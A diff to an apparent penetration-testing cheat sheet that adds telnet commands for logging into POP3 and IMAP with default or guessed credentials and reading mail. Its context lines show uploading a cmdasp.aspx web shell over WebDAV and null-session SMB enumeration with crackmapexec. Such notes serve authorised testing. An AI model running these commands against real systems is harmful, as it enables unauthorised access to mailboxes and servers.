@@ -175,6 +175,16 @@ dav:/ put cmdasp.aspx cmdasp.txt
 dav:/ put cmdasp.txt cmdasp.aspx
 ```
 
+- POP3 (port 110)
+
+```
+$ telnet <IP address> 110
+USER admin
+PASS admin
+LIST
+RETR 1
+```
+
 - RPCBIND (port 111)
 
 ```
@@ -212,6 +222,15 @@ $ crackmapexec smb <IP address> --shares
 $ crackmapexec smb <IP address> --shares -u '' -p ''
 $ crackmapexec smb <IP address> --shares -u <username> -p '<password>'
 $ crackmapexec winrm <IP address> -u <username> -p '<password>'
+```
+
+- IMAP (port 143)
+
+```
+$ telnet <IP address> 143
+1 LOGIN username password
+1 LIST "" *
+1 FETCH <ID> all
 ```
 
 - SNMP (udp/port 161)
